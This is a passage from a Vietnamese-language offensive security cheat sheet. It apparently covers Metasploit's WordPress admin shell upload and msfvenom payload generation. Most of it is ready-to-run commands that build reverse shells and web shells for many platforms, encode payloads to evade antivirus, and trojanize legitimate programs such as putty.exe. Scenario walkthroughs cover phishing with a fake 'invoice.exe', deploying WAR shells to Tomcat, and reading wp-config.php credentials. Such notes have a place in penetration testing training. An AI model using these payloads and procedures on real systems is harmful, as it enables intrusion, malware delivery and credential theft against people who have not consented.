Bước 1 — Có credential admin (từ brute force / SQLi / credential exposure)

Bước 2 — [ATTACKER] msfconsole
use exploit/unix/webapp/wp_admin_shell_upload
set RHOSTS <target_ip>
set USERNAME admin
set PASSWORD <password>
set LHOST <attacker_ip>
run

Bước 3 — Có Meterpreter session
sysinfo
getuid
shell

Bước 4 — Đọc wp-config.php lấy DB credential
cat /var/www/html/wp-config.php

Bước 5 — Post-exploitation
run post/multi/recon/local_exploit_suggester
```

---

## Tips

- Module này cần quyền **admin** — kết hợp với WPScan brute force để có credential trước
- Nếu target chặn port 4444, thử `set LPORT 80` hoặc `set LPORT 443` — thường không bị chặn outbound
- Dùng `set PAYLOAD php/meterpreter_reverse_tcp` (stageless) khi mạng không ổn định
- Sau khi có shell, đọc `wp-config.php` ngay — chứa DB credential có thể dùng để leo thang thêm
- Dùng `sessions -u <id>` để upgrade shell thường lên Meterpreter nếu cần

---

# msfvenom

**Tích hợp trong:** Metasploit Framework
**Tác giả:** Rapid7
**Ngôn ngữ:** Ruby

## Khái niệm

msfvenom là tool **tạo payload độc lập** của Metasploit — kết hợp `msfpayload` và `msfencode` thành một lệnh duy nhất. Dùng để tạo file thực thi, script, shellcode chứa reverse shell / bind shell cho mọi nền tảng mà không cần msfconsole đang chạy.

**Dùng khi nào:**
- Cần tạo payload để upload lên target (web shell, EXE, ELF, APK...)
- Cần shellcode nhúng vào exploit tự viết
- Cần encode payload để bypass AV cơ bản
- Target không có kết nối internet → tạo payload offline rồi chuyển sang

---

## Cú pháp cơ bản

```
msfvenom -p <payload> [options] LHOST=<ip> LPORT=<port> -f <format> -o <output>
```

---

## Các cờ quan trọng

| Cờ | Mô tả |
|----|-------|
| `-p <payload>` | Payload sử dụng |
| `LHOST=<ip>` | IP attacker nhận kết nối (reverse) |
| `LPORT=<port>` | Port attacker lắng nghe |
| `RHOST=<ip>` | IP target (bind shell) |
| `-f <format>` | Định dạng output (exe, elf, php, raw, py...) |
| `-o <file>` | File output |
| `-e <encoder>` | Encoder để obfuscate payload |
| `-i <n>` | Số lần encode lặp lại |
| `-b <chars>` | Bad characters cần tránh (buffer overflow) |
| `-n <n>` | Thêm n byte NOP sled trước payload |
| `--smallest` | Tạo payload nhỏ nhất có thể |
| `-a <arch>` | Architecture (x86, x64, arm...) |
| `--platform <os>` | Platform (windows, linux, android...) |
| `-l payloads` | Liệt kê tất cả payload |
| `-l formats` | Liệt kê tất cả format output |
| `-l encoders` | Liệt kê tất cả encoder |

---

## Liệt kê payload / format / encoder

```bash
# Xem tất cả payload
msfvenom -l payloads

# Lọc theo keyword
msfvenom -l payloads | grep "windows/x64"
msfvenom -l payloads | grep "php"
msfvenom -l payloads | grep "linux"

# Xem tất cả format output
msfvenom -l formats

# Xem tất cả encoder
msfvenom -l encoders

# Xem option của một payload cụ thể
msfvenom -p windows/meterpreter/reverse_tcp --list-options
```

---

## Payload phổ biến theo nền tảng

### Windows

```bash
# Reverse TCP — Meterpreter (staged)
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -f exe -o shell_x86.exe

# Reverse TCP — Meterpreter x64 (staged)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -f exe -o shell_x64.exe

# Reverse TCP — Meterpreter x64 stageless
msfvenom -p windows/x64/meterpreter_reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -f exe -o shell_stageless.exe

# Reverse HTTPS — traffic trông như HTTPS bình thường
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=192.168.1.100 LPORT=443 \
  -f exe -o shell_https.exe

# Bind TCP — target lắng nghe, attacker kết nối vào
msfvenom -p windows/x64/meterpreter/bind_tcp \
  RHOST=192.168.1.10 LPORT=4444 \
  -f exe -o bind_shell.exe

# DLL injection
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -f dll -o evil.dll

# PowerShell payload (không cần file EXE)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -f psh -o shell.ps1
```

### Linux

```bash
# Reverse TCP — ELF x86
msfvenom -p linux/x86/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -f elf -o shell_x86.elf

# Reverse TCP — ELF x64
msfvenom -p linux/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -f elf -o shell_x64.elf

# Stageless ELF x64
msfvenom -p linux/x64/meterpreter_reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -f elf -o shell_stageless.elf

# Shell đơn giản (không cần Meterpreter)
msfvenom -p linux/x64/shell_reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -f elf -o simple_shell.elf
```

### Web — PHP

```bash
# PHP Meterpreter (staged)
msfvenom -p php/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -f raw -o shell.php

# PHP shell đơn giản (stageless)
msfvenom -p php/reverse_php \
  LHOST=192.168.1.100 LPORT=4444 \
  -f raw -o simple_shell.php

# Sau khi tạo — thêm <?php ở đầu nếu thiếu
echo "<?php" | cat - shell.php > shell_fixed.php
```

### Web — ASP / ASPX (Windows IIS)

```bash
# ASP reverse shell
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -f asp -o shell.asp

# ASPX reverse shell
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -f aspx -o shell.aspx
```

### Web — JSP / WAR (Java / Tomcat)

```bash
# JSP reverse shell
msfvenom -p java/jsp_shell_reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -f raw -o shell.jsp

# WAR file (deploy lên Tomcat manager)
msfvenom -p java/jsp_shell_reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -f war -o shell.war
```

### Android

```bash
# APK reverse shell
msfvenom -p android/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -o evil.apk
```

### macOS

```bash
# macOS reverse shell
msfvenom -p osx/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -f macho -o shell.macho
```

### Shellcode (nhúng vào exploit)

```bash
# Raw shellcode — C format
msfvenom -p linux/x64/shell_reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -f c

# Raw shellcode — Python format
msfvenom -p linux/x64/shell_reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -f python

# Raw shellcode — hex
msfvenom -p linux/x64/shell_reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -f hex
```

---

## Encoding — Bypass AV cơ bản

```bash
# Encode với shikata_ga_nai (x86, phổ biến nhất)
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -e x86/shikata_ga_nai -i 5 \
  -f exe -o encoded_shell.exe

# Encode x64
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -e x64/xor_dynamic -i 3 \
  -f exe -o encoded_x64.exe

# Tránh bad characters (dùng trong buffer overflow)
msfvenom -p windows/shell_reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -b "\x00\x0a\x0d" \
  -f c
```

> Encoding đơn giản không đủ bypass AV hiện đại — chỉ hiệu quả với AV cũ hoặc trong lab.

---

## Nhúng payload vào file hợp lệ

```bash
# Nhúng vào EXE có sẵn (putty.exe, notepad.exe...)
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -x /path/to/putty.exe \
  -k \
  -f exe -o putty_evil.exe
# -x : file template
# -k : giữ chức năng gốc của file template
```

---

## Ví dụ minh họa theo kịch bản

### Kịch bản 1 — Upload PHP shell lên WordPress

```bash
# [ATTACKER] — Tạo PHP Meterpreter shell
msfvenom -p php/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -f raw -o wp_shell.php

# Mở listener trong msfconsole
use exploit/multi/handler
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
run -j

# Upload wp_shell.php lên WordPress qua theme editor / plugin upload
# Truy cập file → nhận Meterpreter session
```

---

### Kịch bản 2 — Windows EXE qua SMB / phishing

```bash
# [ATTACKER] — Tạo EXE x64 stageless (không cần stage download)
msfvenom -p windows/x64/meterpreter_reverse_tcp \
  LHOST=192.168.1.100 LPORT=443 \
  -f exe -o invoice.exe

# Mở listener
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter_reverse_tcp
set LHOST 192.168.1.100
set LPORT 443
run -j

# Chuyển invoice.exe sang target qua SMB / phishing
# Target chạy file → nhận Meterpreter session
```

---

### Kịch bản 3 — WAR shell lên Tomcat Manager

```bash
# [ATTACKER] — Tạo WAR file
msfvenom -p java/jsp_shell_reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -f war -o shell.war

# Mở listener
use exploit/multi/handler
set PAYLOAD java/jsp_shell_reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
run -j

# [ATTACKER] — Deploy WAR lên Tomcat Manager (cần credential)
# http://target.lab:8080/manager/html → Upload → Deploy shell.war
# Truy cập: http://target.lab:8080/shell/
# → nhận reverse shell
```

---

### Kịch bản 4 — Shellcode cho buffer overflow

```bash
# [ATTACKER] — Tạo shellcode tránh bad chars \x00\x0a\x0d
msfvenom -p windows/shell_reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -b "\x00\x0a\x0d" \
  -f python \
  -v shellcode

# Output dạng Python variable:
# shellcode =  b""
# shellcode += b"\xdb\xc0\xd9\x74\x24\xf4..."

# Nhúng shellcode vào exploit script
```

---

### Kịch bản 5 — Linux ELF qua file upload / LFI

```bash
# [ATTACKER] — Tạo ELF x64
msfvenom -p linux/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -f elf -o shell.elf

chmod +x shell.elf

# Mở listener
use exploit/multi/handler
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
run -j

# Upload shell.elf lên target qua file upload vuln
# Thực thi: curl http://target.lab/uploads/shell.elf → nhận session
```

---

## Bảng tóm tắt payload theo mục đích

| Mục đích | Payload | Format |
|----------|---------|--------|
| Windows reverse shell | `windows/x64/meterpreter/reverse_tcp` | `exe` |
| Windows HTTPS evasion | `windows/x64/meterpreter/reverse_https` | `exe` |
| Linux reverse shell | `linux/x64/meterpreter/reverse_tcp` | `elf` |
| PHP web shell | `php/meterpreter/reverse_tcp` | `raw` |
| ASP web shell (IIS) | `windows/meterpreter/reverse_tcp` | `asp` |
| ASPX web shell (IIS) | `windows/meterpreter/reverse_tcp` | `aspx` |
| Tomcat deploy | `java/jsp_shell_reverse_tcp` | `war` |
| Android | `android/meterpreter/reverse_tcp` | `apk` |
| Buffer overflow | `windows/shell_reverse_tcp` | `c` / `python` |
| PowerShell | `windows/x64/meterpreter/reverse_tcp` | `psh` |

---

## Tips

- Dùng `LPORT=443` hoặc `LPORT=80` — outbound traffic trên các port này thường không bị chặn
- Stageless payload (`meterpreter_reverse_tcp` với dấu `_`) ổn định hơn khi mạng không tốt
- Luôn mở listener trước khi chạy payload trên target
- Dùng `reverse_https` thay `reverse_tcp` khi cần traffic trông hợp lệ hơn
- `-b "\x00"` là bad char tối thiểu cần tránh trong hầu hết buffer overflow
- Kiểm tra payload hoạt động trong lab trước khi dùng trong pentest thực tế
